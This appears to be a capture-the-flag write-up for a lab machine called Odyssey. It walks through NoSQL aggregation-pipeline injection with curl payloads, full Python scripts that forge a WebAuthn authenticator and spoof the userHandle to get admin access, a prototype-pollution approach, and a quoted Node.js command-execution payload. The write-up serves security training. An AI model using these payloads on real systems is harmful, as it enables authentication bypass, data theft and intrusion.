![](Odyssey.assets/banner.png)



<img src="Odyssey.assets/avatar.png" style="margin-left: 20px; zoom: 60%;" align=left />	<font size="10">Odyssey</font>

​		14<sup>th</sup> May 2026

​		Prepared By: Rogue

​		Machine Author: Rogue

​		Difficulty: <font color=grey>Insane</font>



# Synopsis

`Odyssey` is an Insane Windows machine that starts with a web application gated behind `WebAuthn` authentication. An endpoint vulnerable to `NoSQL Pipeline Aggregation Injection` provides access to unclaimed onboarding tokens, which can then be used to register a custom-made authenticator to log in to the application. A `userHandle` confusion vulnerability provides admin access to the application. Administrators have access to a template drafting and render preview panel, where a `merge` sink allows `prototype pollution`. Polluting the `allowRawBlocks` prototype enables raw LaTeX blocks to be passed through pandoc, which allows local file contents to be retrieved via special LaTeX primitives that escape catcode encoding. Then, an endpoint vulnerable to CVE-2025-1302 is identified in the application's source code, which provides access to the Linux web server as `webadmin`. Password reuse grants privileged access to the Linux server via `webadmin's` `sudo` group membership. `bulkadmin` privileges on an MSSQL account enable coercion via the BULK INSERT statement. The retrieved NTLMv2 hash can be cracked, providing access to the `MSSQL` server as a sysadmin. 

Then, enabling `xp_cmdshell` allows command execution on `Odyssey-DB`, where the `SeImpersonatePrivilege` privilege of the account enables privilege escalation. Through local hive extraction, the machine account of `Odyssey-DB` is retrieved, which has `addKeyCredentialLink` rights on `svc-aegis-build` through multiple group membership inheritance. Next, a `dMSA Ouroboros` attack chain provides access to the `svc-aegis-deploy` user, who can access the domain controller via `WinRM`. Finally, a `.NET` pipe application is exploited through unsafe `YAML` deserialization and weak credential management.

## Skills Required

- NoSQL queries and Injection
- WebAuthn Authentication Flow
- Server-Side Template Injection
- LaTeX Scripting
- Advanced AD Attack Chains
- .NET Reverse Engineering
- PIPE interaction and Exploitation
- YAML Deserialization

## Skills Learned

- NoSQL Pipeline Aggregation Injection
- WebAuthn Authenticator Forgery and userHandle Confusion
- Oracle-Based SSTI
- Latex Scripting and Formatting
- MSSQL Authentication Coercion
- Post-badSuccessor dMSA Exploitation
- .NET PIPE Application Exploitation
- YAML Deserialization

# Enumeration

## Nmap

We start by running an `nmap` scan against the target.

```shell
$ sudo nmap -Pn -sV -A -p- -T4 192.168.1.140
<SNIP>
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Did not follow redirect to http://aegis.korvia.htb:3000/
MAC Address: 3C:6A:D2:C2:51:1F (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), <SNIP>
```

The `nmap` output shows that only port `3000` is accessible. The application hosted on this port appears to be a `Node.js` app, and a standard `GET` request to `/` redirects to `aegis.korvia.htb`. Before we proceed, we will add that domain name to our `/etc/hosts` file.

## Web Application Enumeration

When we visit the website, we are redirected to the `/login` page, which only supports hardware-based authentication.

![](Odyssey.assets/web_app_1.png)

Performing a dummy authentication request as any user, produces the following `POST` request against `/api/v1/auth/webauthn/auth/begin`.

```json
{
	"rpId":"aegis.korvia.htb",
  "challenge":"vK2TACUaNmXqYDa_lSEoI-V_uvQibBjPZW2TOJOWG_g",
  "allowCredentials":[
    ],
  "timeout":60000,"userVerification":"preferred"
}
```

From the endpoint alone, we get the following information: an `API` endpoint exists at `/api/v1`, and the backend authentication service is `WebAuthn`. During a background fuzzing session, the following endpoints were enumerated.

```shell
$ gobuster dir -u http://aegis.korvia.htb:3000/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
<SNIP>
/img                  (Status: 301) [Size: 153] [--> /img/]
/login                (Status: 200) [Size: 4378]
/account              (Status: 302) [Size: 28] [--> /login]
/css                  (Status: 301) [Size: 153] [--> /css/]
/status               (Status: 302) [Size: 28] [--> /login]
/js                   (Status: 301) [Size: 152] [--> /js/]
/logout               (Status: 302) [Size: 28] [--> /login]
/dashboard            (Status: 302) [Size: 28] [--> /login]
/requests             (Status: 302) [Size: 28] [--> /login]
/onboard              (Status: 400) [Size: 2543]
```

Every endpoint enumerated redirects to the `/login` page, indicating the application is tightly gated behind authentication. There is one endpoint, though, that is interesting: `/onboard`, which returned status `400`.

![](Odyssey.assets/web_app_2.png)

Based on the endpoint's information, we assume that to register for the application, we need an invitation token bound to existing operators, which is single-use, meaning it is consumed upon successful onboarding. Following the application's instructions with a dummy token value:

![](Odyssey.assets/web_app_3.png)

We now know that a `pending_invites` list exists, which may contain tokens that have not yet been redeemed during onboarding.

Going back to the `/login` page, if we observe the requests performed through a proxy like `Burp`:

![](Odyssey.assets/web_app_4.png)

![](Odyssey.assets/web_app_5.png)

The endpoint returns AAGUID metadata for `WebAuthn/FIDO` authenticators. This doesn't provide us with any useful information for now, but we have an endpoint we can test, since it clearly retrieves data via database queries.

# Foothold

## NoSQL Aggregation Pipeline Injection

The very first step is to identify the type of database we are working with. After trying multiple payloads that might provide some footprint, the classic `NoSQL Injection $ne` operator provides the following response:

```  shell
$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?q\[$ne\]=test&limit=2' | jq
<SNIP>
{
  "error": "InvalidQueryShape",
  "detail": "Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.",
  "trace_id": "mds-207bd0"
}
```

This indicates that we are working with a `NoSQL` database, most likely `MongoDB`. In addition, the application hints at the usage of a parameter called `pipeline`. This is a common parameter used in `MongoDB-based applications` due to the documented concept of [Pipeline Aggregation](https://www.mongodb.com/docs/manual/core/aggregation-pipeline/). Following the most basic pipeline request, which is to return just one document, we can test this parameter and walk through its behavior.

```shell
$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=\[\{%22$limit%22:%20%201\}\]' | jq
<SNIP>
[
  {
  	"_id": "69f49023225fb3c680909240",
  	"aaguid": "566581a4-5a65-9f87-c652-52851474f127",
  	"vendor": "Yubico",
  	"description": "YubiKey 5C",
<SNIP>
```

This response verifies our claim, as evident in the documentation provided above: pipeline aggregation works with stages, and the `limit` provided just one document as expected. Performing a Google search for `MongoDB Aggregation Pipeline Injection`, we come across various articles, like [this](https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines) one. In a section of this article, `Reading Data from Other Collections`, the author explains how aggregation can be utilized to access other collections. We know that the collection we are interested in is the `pending_invites` collection we enumerated earlier. If we follow the article, with the `$lookup` operator, for example:

```shell
$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=\[\{%22$lookup%22:%20\{%22from%22:%20%22pending_invites%22\}\}\]' | jq
<SNIP>
{
  "error": "invalid or disallowed pipeline stage"
}
```

We find out that there are stages that are disallowed by the application. Even `$unionWith`, `$merge`, and other operators that can be used to read data from other collections are disallowed. This leaves us with no option but to read the `pending_invites` collection directly.

One way to bypass stage restrictions is to find a stage that allows sub-pipelines in its workflow. Using an LLM Chatbot or Google, we can search for common stages that allow sub-pipelines in `MongoDB`:

![](Odyssey.assets/web_app_6.png)

We already know that `$lookup` and `$unionWith` are blocked by the application. Trying `$facet`:

```shell
$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=\[\{%22$facet%22:%20\{%22test%22:%20%22test%22\}\}\]' | jq
<SNIP>
{
  "error": "MongoServerError",
  "detail": "arguments to $facet must be arrays, test is type string",
  "ns": "aegis_mds.mds_entries",
  "trace_id": "mds-dcb9d4"
}
```

The application returns a format error, confirming that the `$facet` stage is allowed. Using `$facet`, we can utilize the `$lookup` operator as a sub-pipeline to perform the read on `pending_invites` we discussed earlier. `MongoDB` has documented the `$facet` operator, which we will use as a baseline for constructing our payload.

First, we need to create a new facet that will contain the `$lookup` sub-pipeline we want to execute.

```json
[
	{
		"$facet":{
			"x":[
				{
					"$lookup":{
						"test":"test2"
					}
				}
			]
		}
	}
]
```

```shell
$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=\[\{%22$facet%22:%20\{%22x%22:\[\{%22$lookup%22:%20\{%22test%22:%22test1%22\}\}\]\}\}\]' | jq
<SNIP>
{
  "error": "MongoServerError",
  "detail": "must specify 'pipeline' when 'from' is empty",
  "ns": "aegis_mds.mds_entries",
  "trace_id": "mds-d29c3b"
}
```

The returned error is a common `$lookup` formatting issue, so we confirmed we can run this operator under a `$facet`. The next step is to properly format the `$lookup` pipeline to retrieve data from the `pending_invites` collection.

```json
[
	{
		"$facet":{
			"x":[
				{
					"$lookup":{
						"from":"pending_invites",
						"as":"y"
					}
				}
			]
		}
	}
]
```

```shell
$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=\[\{%22$facet%22:%20\{%22x%22:\[\{%22$lookup%22:%20\{%22from%22:%22pending_invites%22,%22as%22:%22y%22\}\}\]\}\}\]' | jq
<SNIP>
{
  "error": "MongoServerError",
  "detail": "$lookup requires either 'pipeline' or both 'localField' and 'foreignField' to be specified",
  "ns": "aegis_mds.mds_entries",
  "trace_id": "mds-62c332"
}
```

The error we receive is expected, since we did not specify any special conditions, such as `localField` and `foreignField`. We can bypass this requirement by passing the pipeline parameter as an empty array.

```json
[
	{
		"$facet":{
			"x":[
				{
					"$lookup":{
						"from":"pending_invites",
						"pipeline":[],
						"as":"y"
					}
				}
			]
		}
	}
]
```

```shell
$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=\[\{%22$facet%22:%20\{%22x%22:\[\{%22$lookup%22:%20\{%22from%22:%22pending_invites%22,%22pipeline%22:\[\],%22as%22:%22y%22\}\}\]\}\}\]' | jq
<SNIP>
{
            "_id": "69f49023225fb3c680909281",
            "operator_id": "op-2026-0192",
            "role": "Operator",
            "token": "3eb2fa5e9648f50b55d8b9270be01424646c4c0f510d7756d20fefe28bc38490",
            "issued_by": "ao-jchen",
            "issued_at": "2026-04-20T05:00:00.000Z",
            "expires_at": "2026-05-20T05:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          },
          {
            "_id": "69f49023225fb3c680909282",
            "operator_id": "op-2026-0210",
            "role": "Operator",
            "token": "06850a86cdf22ea95408fb7f874911b6a9e59ddde3ef93109be3fed1143f10a8",
            "issued_by": "ao-tnemec",
            "issued_at": "2026-04-20T14:00:00.000Z",
            "expires_at": "2026-05-20T14:00:00.000Z",
            "redeemed": false,
            "pipeline": "forge-recruitment",
            "clearance_target": "Δ-3"
          }
<SNIP>
```

The injection is successful, and we have retrieved multiple operator tokens that have not yet been redeemed. To make output more pristine and focused on only what we are interested in, we can follow the `MongoDB` documentation to improve our payload further:

```json
[
  {
    "$limit":1
  },
	{
		"$facet":{
			"x":[
				{
					"$lookup":{
						"from":"pending_invites",
						"as":"y"
					}
				},
        {
          "$unwind":"$y"
        },
        {
          "$replaceRoot":{
            "newRoot":"$y"
          }
        }
			]
		}
	}
]
```

```shell
$ curl 'http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=\[\{%22$limit%22:1\},\{%22$facet%22:\{%22x%22:\[\{%22$lookup%22:\{%22from%22:%22pending_invites%22,%22pipeline%22:\[\],%22as%22:%22y%22\}\},\{%22$unwind%22:%22$y%22\},\{%22$replaceRoot%22:\{%22newRoot%22:%22$y%22\}\}\]\}\}\]' | jq           
[
	{
		"x": [
			{	
			"_id": "69f49023225fb3c680909274",
			"operator_id": "op-2026-0042",
        "role": "Operator",
        "token": "dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238",
        "issued_by": "ao-mreyes",
        "issued_at": "2026-04-15T08:00:00.000Z",
        "expires_at": "2026-05-15T08:00:00.000Z",
        "redeemed": false,
        "pipeline": "forge-recruitment",
        "clearance_target": "Δ-3"
      },
<SNIP>
```

## WebAuthn Synthetic Registration and userHandle Confusion

Armed with a token, we can now onboard a user through the `/onboard` endpoint. 

![](Odyssey.assets/web_app_7.png)

When we click `Begin Authenticator Attestation`, the application informs us that authenticator attestation is not allowed outside localhost. Looking at `Burp`, we observe the `POST` request to `/api/v1/auth/webauthn/register/login` and its response.

```json
{
  "challenge": "-QQ1_1X-ll9NairFqL3T6NlBGgjoSLusNeHgDvL16UA",
  "rp": {
    "name": "AEGIS — Sovereign Signing & Attestation Authority",
    "id": "aegis.korvia.htb"
  },
  "user": {
    "id": "b3AtMjAyNi0wMDQy",
    "name": "op-2026-0042",
    "displayName": "op-2026-0042"
  },
  "pubKeyCredParams": [
    {
      "alg": -7,
      "type": "public-key"
    },
    {
      "alg": -257,
      "type": "public-key"
    }
  ],
  "timeout": 60000,
  "attestation": "none",
  "excludeCredentials": [],
  "authenticatorSelection": {
    "residentKey": "required",
    "userVerification": "preferred",
    "requireResidentKey": true
  },
  "extensions": {
    "credProps": true
  }
}
```

There is a lot of useful information in this response, which we will revisit later. For now, the most important piece of information we get is the `"attestation": "none"` key. In `WebAuthn`, when `attestation` is `none`, in practice, the browser/authenticator strips or anonymizes attestation data before sending the registration response back to the server. While the application shows the final error that registration is not allowed outside localhost, we can still reach the registration API endpoint. By combining these two pieces of information, we can create our own authenticator client to onboard the token ourselves.

There are multiple ways to achieve this result. For this writeup, we will work on modifying a pre-existing client authenticator, such as [soft-webauthn](https://github.com/bodik/soft-webauthn/tree/master). To begin, we will add a POST request to the registration API endpoint to retrieve the `challenge` and `user_id` corresponding to the submitted key. We will use `fido2.utils` to decode both values.

````python
from fido2.utils import websafe_decode, websafe_encode

BASE   = "http://aegis.korvia.htb:3000"
TOKEN  = "PUT-YOUR-INVITE-TOKEN-HERE"

s = requests.Session()

r = s.post(f"{BASE}/api/v1/auth/webauthn/register/begin",
           json={"invite_token": TOKEN})
r.raise_for_status()
opts      = r.json()
challenge = websafe_decode(opts["challenge"])
user_id   = websafe_decode(opts["user"]["id"])
print(f"[+] reserved operator user_id: {user_id.decode()}")
````

We can now proceed to create the private key. The server's response already told us the type of key it expects: `"alg": -7`. According to the [IANA](https://www.iana.org/assignments/cose/cose.xhtml) assignments, this is an `ECDSA w/ SHA-256` key type.

```python
from cryptography.hazmat.primitives.asymmetric import ec

priv  = ec.generate_private_key(ec.SECP256R1())
```

Now we can proceed to create the `COSE-encoded public key` that is embedded in the WebAuthn `attestationObject`. First, we need to generate the elliptic-curve public key coordinates from our private key.

```python
pn    = priv.public_key().public_numbers()
i2b   = lambda n: n.to_bytes(32, "big")
```

Following [RFC9053](https://datatracker.ietf.org/doc/html/rfc9053) and other sources, we create the public key in the COSE format that WebAuthn expects. The key type must be `EC2`, using the `ES256` algorithm with the `P-256` curve.

```python
cose_pub = {1: 2, 3: -7, -1: 1, -2: i2b(pn.x), -3: i2b(pn.y)}
```

We also need to construct the registration data. We start by generating a random credential ID and hashing the `RP_ID` value we have already acquired.

```python
RP_ID  = "aegis.korvia.htb"
cred_id    = os.urandom(32)
rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
```

Using the [W3 Recommendations](https://www.w3.org/TR/webauthn-2/) and the soft-webauthn script as guidelines, we can fill in the remaining authentication data. We need the `User Present 0x01` and `Attested credential data included 0x40` flags, so the flag becomes `0x41`.  We will construct a signature counter with value 1 and set the AAGUID to all zeroes, since we do not need to provide an authenticator model/type for the self-made authenticator we are creating.

```python
flags      = 0x41   # UP | AT
counter    = struct.pack(">I", 1)
aaguid     = b"\x00" * 16
attested   = aaguid + struct.pack(">H", len(cred_id)) + cred_id + cbor2.dumps(cose_pub)
auth_data  = rp_id_hash + bytes([flags]) + counter + attested
```

Now that we have all the data the server expects for a successful WebAuthn registration, it is time to construct the proper data structures and send them to the server. First, we need to build the CBOR-encoded attestation object. Since no attestation is needed, we will set both the `fmt` and `attStmt` values to `none`.

```python
attestation_obj = cbor2.dumps({"fmt": "none", "attStmt": {}, "authData": auth_data})
```

Next, we build the client data `JSON` generated by the browser in a typical WebAuthn flow. We will set the origin to the Korvia domain name, to prevent mitigations against replay attacks, and set `cross-origin` to `false` to assert that it was not triggered from a cross-origin context.

```python
ORIGIN = "http://aegis.korvia.htb:3000"

client_data = json.dumps({
    "type": "webauthn.create",
    "challenge": websafe_encode(challenge),
    "origin": ORIGIN,
    "crossOrigin": False,
}, separators=(",", ":")).encode()
```

The next step is to construct the `JSON` object sent to `/register/finish` that mimics what `navigator.credentials.create()` returns in the browser.

```python
body = {
    "id":    websafe_encode(cred_id),
    "rawId": websafe_encode(cred_id),
    "type":  "public-key",
    "response": {
        "clientDataJSON":    websafe_encode(client_data),
        "attestationObject": websafe_encode(attestation_obj),
    },
    "clientExtensionResults": {},
}
r = s.post(f"{BASE}/api/v1/auth/webauthn/register/finish", json=body)
print(f"[+] register/finish: {r.status_code} {r.text}")
r.raise_for_status()
```

Finally, we will save the private key, the Credential ID, and the user ID in a local file for later authentication.

```python
priv_pem = priv.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption(),
)

with open("aegis_cred.pkl", "wb") as f:
    pickle.dump({"priv_pem": priv_pem, "cred_id": cred_id, "user_id": user_id}, f)
print("[+] credential saved to ./aegis_cred.pkl")
```

The full final script:

```python
#!/usr/bin/env python3
import os, json, hashlib, struct, pickle, requests, cbor2
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

BASE   = "http://aegis.korvia.htb:3000"
RP_ID  = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"
TOKEN  = "PUT-YOUR-INVITE-TOKEN-HERE"

s = requests.Session()

r = s.post(f"{BASE}/api/v1/auth/webauthn/register/begin",
           json={"invite_token": TOKEN})
r.raise_for_status()
opts      = r.json()
challenge = websafe_decode(opts["challenge"])
user_id   = websafe_decode(opts["user"]["id"])
print(f"[+] reserved operator user_id: {user_id.decode()}")

priv  = ec.generate_private_key(ec.SECP256R1())
pn    = priv.public_key().public_numbers()
i2b   = lambda n: n.to_bytes(32, "big")
cose_pub = {1: 2, 3: -7, -1: 1, -2: i2b(pn.x), -3: i2b(pn.y)}

cred_id    = os.urandom(32)
rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
flags      = 0x41   # UP | AT
counter    = struct.pack(">I", 1)
aaguid     = b"\x00" * 16
attested   = aaguid + struct.pack(">H", len(cred_id)) + cred_id + cbor2.dumps(cose_pub)
auth_data  = rp_id_hash + bytes([flags]) + counter + attested

attestation_obj = cbor2.dumps({"fmt": "none", "attStmt": {}, "authData": auth_data})

client_data = json.dumps({
    "type": "webauthn.create",
    "challenge": websafe_encode(challenge),
    "origin": ORIGIN,
    "crossOrigin": False,
}, separators=(",", ":")).encode()

body = {
    "id":    websafe_encode(cred_id),
    "rawId": websafe_encode(cred_id),
    "type":  "public-key",
    "response": {
        "clientDataJSON":    websafe_encode(client_data),
        "attestationObject": websafe_encode(attestation_obj),
    },
    "clientExtensionResults": {},
}
r = s.post(f"{BASE}/api/v1/auth/webauthn/register/finish", json=body)
print(f"[+] register/finish: {r.status_code} {r.text}")
r.raise_for_status()

priv_pem = priv.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption(),
)

with open("aegis_cred.pkl", "wb") as f:
    pickle.dump({"priv_pem": priv_pem, "cred_id": cred_id, "user_id": user_id}, f)
print("[+] credential saved to ./aegis_cred.pkl")
```

Using one of the tokens we exfiltrated earlier, we will run the script and successfully register our authenticator with the application, generating the credentials file in the process.

```shell
$ python3 webauthn_register.py                                     
[+] reserved operator user_id: op-2026-0042
[+] register/finish: 200 {"ok":true,"operator_id":"op-2026-0042","message":"Credential bound. You may now authenticate."}
[+] credential saved to ./aegis_cred.pkl
```

Following the same documentation we have been utilizing until this point, we can create a login script. The expected result of this script is a cookie for the application that corresponds to the authenticated user's session.

First, we load the authentication credentials we generated earlier.

```python
data    = pickle.load(open("aegis_cred.pkl", "rb"))
priv    = serialization.load_pem_private_key(data["priv_pem"], password=None)
cred_id = data["cred_id"]
user_id = data["user_id"]
print(f"[+] loaded credential for {user_id.decode()}")
```

Then we ping the `/auth/begin` endpoint to get a challenge.

```python
s = requests.Session()

r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/begin", json={})
r.raise_for_status()
challenge = websafe_decode(r.json()["challenge"])
```

We fill the authentication data parameters, this time using only the `UP` flag.

```python
rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
flags      = 0x01   # UP
counter    = struct.pack(">I", 2)
auth_data  = rp_id_hash + bytes([flags]) + counter
```

Now we fill in the client data, this time using `webauthn.get`.

```python
client_data = json.dumps({
    "type":       "webauthn.get",
    "challenge":  websafe_encode(challenge),
    "origin":     ORIGIN,
    "crossOrigin": False,
}, separators=(",", ":")).encode()
```

Finally, we will sign the authentication data with our private key, and send the expected body, mimicking `navigator.credentials.get()`. After the authentication chain completes, we will dump the cookie for the authenticated user.

```python
to_sign = auth_data + hashlib.sha256(client_data).digest()
sig     = priv.sign(to_sign, ec.ECDSA(hashes.SHA256()))

body = {
    "id":    websafe_encode(cred_id),
    "rawId": websafe_encode(cred_id),
    "type":  "public-key",
    "response": {
        "clientDataJSON":    websafe_encode(client_data),
        "authenticatorData": websafe_encode(auth_data),
        "signature":         websafe_encode(sig),
        "userHandle":        websafe_encode(user_id),   # userHandle confusion
    },
    "clientExtensionResults": {},
}

r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body)
print(f"[+] auth/finish: {r.status_code} {r.text}")
r.raise_for_status()

r = s.get(f"{BASE}/dashboard")
m = re.search(r"Welcome back,\s*([^.<]+)", r.text)
print(f"[+] logged in as: {m.group(1).strip() if m else '(could not parse)'}")
print(f"[+] session cookie: aegis.sid={s.cookies.get('aegis.sid')}")
```

The full script:

```python
#!/usr/bin/env python3
import json, hashlib, struct, pickle, time, re, requests
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import ec

BASE   = "http://aegis.korvia.htb:3000"
RP_ID  = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"

data    = pickle.load(open("aegis_cred.pkl", "rb"))
priv    = serialization.load_pem_private_key(data["priv_pem"], password=None)
cred_id = data["cred_id"]
user_id = data["user_id"]
print(f"[+] loaded credential for {user_id.decode()}")

s = requests.Session()

r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/begin", json={})
r.raise_for_status()
challenge = websafe_decode(r.json()["challenge"])

rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
flags      = 0x01   # UP
counter    = struct.pack(">I", 2)
auth_data  = rp_id_hash + bytes([flags]) + counter

client_data = json.dumps({
    "type":       "webauthn.get",
    "challenge":  websafe_encode(challenge),
    "origin":     ORIGIN,
    "crossOrigin": False,
}, separators=(",", ":")).encode()

to_sign = auth_data + hashlib.sha256(client_data).digest()
sig     = priv.sign(to_sign, ec.ECDSA(hashes.SHA256()))

body = {
    "id":    websafe_encode(cred_id),
    "rawId": websafe_encode(cred_id),
    "type":  "public-key",
    "response": {
        "clientDataJSON":    websafe_encode(client_data),
        "authenticatorData": websafe_encode(auth_data),
        "signature":         websafe_encode(sig),
        "userHandle":        websafe_encode(user_id),
    },
    "clientExtensionResults": {},
}

r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body)
print(f"[+] auth/finish: {r.status_code} {r.text}")
r.raise_for_status()

print(f"[+] session cookie: aegis.sid={s.cookies.get('aegis.sid')}")
```

```shell
$ python3 webauthn_login.py   
[+] loaded credential for op-2026-0042
[+] auth/finish: 200 {"ok":true,"handle":"op-2026-0042","display_name":"op-2026-0042","role":"Operator","clearance":"?-3","redirect":"/dashboard"}
[+] session cookie: aegis.sid=s%3AdM3i72SPV9ZqlyWgr1S0bvk_GiQjzn7I.WJ1S9X%2BCNVF9nM3Q3AjMuHR0u2MXvj4%2BlMkbY7HL9Lo
```

Using the generated cookie in our browser, we can access the application's dashboard.

![](Odyssey.assets/web_app_8.png)

As operators, we do not have much functionality to experiment with. The next logical step is to find a way to escalate to higher privileges, if there are any. Looking around the web application, in the Console panel, we can see an actor named `admin`.

![](Odyssey.assets/web_app_9.png)

So we found that there may be a more powerful role than the one we have now. Looking back at the registration response we received from the server when we attempted to onboard a token, we can see the value `id`, which corresponds to the user ID we were using.

![](Odyssey.assets/web_app_10.png)

If we `base64 decode` this value:

```shell
$ echo "b3AtMjAyNi0wMjEw" | base64 -d                                
op-2026-0210
```

It just matches the account's name and display name. If the application assigns permissions during the authentication step only based on the user's ID, and unquestioningly validates it because the authentication flow is a valid WebAuthn device registration + authentication, we could change the ID to admin and see if we can get authorized as administrators. We will run the same device registration script again using another token, and then the login script, but this time, using `admin` as the user ID:

```python
"userHandle":        websafe_encode(b"admin"),
```

Doing so, we successfully gain `administrator` access using the new session cookie.

![](Odyssey.assets/web_app_11.png)

## Raw-Block File Read via Prototype Pollution

Aside from the `Notice Templates` panel, which appears useful for enumeration, `Operator Roster` and `Authorization Queue` do not appear to provide any exploitation vectors.

We open one of the templates to edit:

![](Odyssey.assets/web_app_12.png)

What we see heavily indicates that there is a template engine in the background. To rule out low-hanging fruit, we will set one of the values, e.g., officer.handle, to `7*7` to verify whether a template injection method is at play. We will `SAVE DRAFT`, and then render the preview. Doing so, we not only discover that we do not have any idea if our payload was triggered, but we also do not get a preview of the actual template - we get a render workflow log.

![](Odyssey.assets/web_app_13.png)

If we observe the request to `/admin/templates/firmware-critical-v4/render` in Burp, we get more information and a more structured reply, though the output is still massive.

```json
{
  "ok": true,
  "finalStage": "gs",
  "artifactPath": "/var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.final.pdf",
  "durationMs": 444,
  "stages": [
    {
      "stage": "nunjucks",
      "code": 0,
      "durationMs": 7,
      "stderr": "",
      "stdout": ""
    },
    {
      "stage": "pandoc",
      "code": 0,
      "durationMs": 37,
      "cmd": "/usr/bin/pandoc --from markdown-raw_attribute --to latex --standalone --template /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/authcert.tex -o /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.tex /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.md",
      "stderr": "",
      "stdout": ""
    },
    {
      "stage": "pdflatex",
      "code": 1,
      "durationMs": 162,
      "cmd": "/usr/bin/pdflatex -interaction=batchmode -no-shell-escape -output-directory /var/lib/aegis-render/jobs/job-1778678191090-984f67fb /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.tex",
 <SNIP>
```

The first thing we notice from the output is the tech stack running in the background - it is a workflow between `Nunjucks` (which provides us with the actual template engine we were trying to enumerate earlier), `Pandoc`, and `pdflatex`. It starts with `Nunjucks` at the templating stage, which passes the output to `Pandoc`. `Pandoc` then converts the data to `.tex`. The `.tex` output is passed to `pdflatex`, which, in this case, fails due to a bad character. After failure, it falls back to the old method of transforming `.tex` to `.pdf`: latex -> dvips -> ghostscript. Then, the final PDF is saved.

```
nunjucks
  ↓
pandoc
  ↓
pdflatex
  ↓ (failed / warnings)
latex
  ↓
dvips
  ↓
ghostscript
  ↓
final PDF
```

One very important thing to note, though, is that we do not have a rendered output of the result, meaning that we have no way to verify the test we performed (`7*7`). The rendered result is only available in the resulting PDF, which we do not have access to. Trying to use common command execution payloads blindly results in silent failures or error messages like this one:

```json
{
  "ok": false,
  "finalStage": "nunjucks",
  "artifactPath": null,
  "durationMs": 6,
  "stages": [
    {
      "stage": "nunjucks",
      "code": 1,
      "durationMs": 5,
      "stderr": "template: disallowed property access",
      "stdout": ""
    }
  ]
}
```

This error was returned when we tried to achieve command execution via `[].constructor.constructor("return process")().mainModule.require('child_process').execSync('sleep 10').toString()`, which usually bypasses most restrictions. This leads us to believe the environment is very tightly locked down, so we opt to look for other ways to exploit this endpoint.

Looking back at the user interface of the application, we can see this bit of code in the template body:

```json
{{ overrides | merge(defaults) | json }}
```

Searching for `Nunjucks` merge filter vulnerabilities returns multiple results, such as [this](https://security.snyk.io/vuln/SNYK-JS-LODASH-567746) Snyk report on `lodash`. In essence, this article explains that functions like `_.merge()` perform recursive property assignment. An object like `{"__proto__": {"polluted": true}}` sets `Object.prototype.polluted = true` for the entire process. In [Mozilla Docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto), it becomes evident that when you access a property on an object, if it doesn't exist as an own property, `JavaScript` walks up `__proto__` to `Object.prototype`. So polluting `Object.prototype.x = 1` means any object literal `{}` will see `obj.x === 1` unless it has its own `x`.

Another critical piece of information we can gather from the internet is [this](https://portswigger.net/research/server-side-prototype-pollution) research from Gareth Heyes. In his insight, you usually cannot see polluted properties reflected in the response body. You need behavior-change oracles - observable side effects that change when a property gets polluted.

Now that we have a strong foundation of what we can do with the `merge` filter, the question is: what can we actually pollute? Back at the application's interface and responses, we can chain two critical pieces of information:

In the overrides section, there is an override called `allowRawBlocks` that defaults to `false`.

```json
{
  "audience": "internal",
  "allowRawBlocks": false,
  "ceremony_witness": "s.vrana"
}
```

In the render log we get as a response from the server, we also see how `pandoc` is invoked.

```json
{
  "stage": "pandoc",
  "code": 0,
  "durationMs": 37,
  "cmd": "/usr/bin/pandoc --from markdown-raw_attribute --to latex --standalone --template /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/authcert.tex -o /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.tex /var/lib/aegis-render/jobs/job-1778678191090-984f67fb/notice.md",
  "stderr": "",
  "stdout": ""
}
```

Reading through `Pandoc's` [manual](https://pandoc.org/MANUAL.html#extension-raw_attribute), we understand that when `raw_attribute` is enabled, inline code spans annotated with a format identifier (e.g. ``` `\latex code`{=latex}```) are passed through verbatim to the output format. The `-` prefix in `--from markdown-raw_attribute` explicitly disables this. The `+` prefix would enable it.

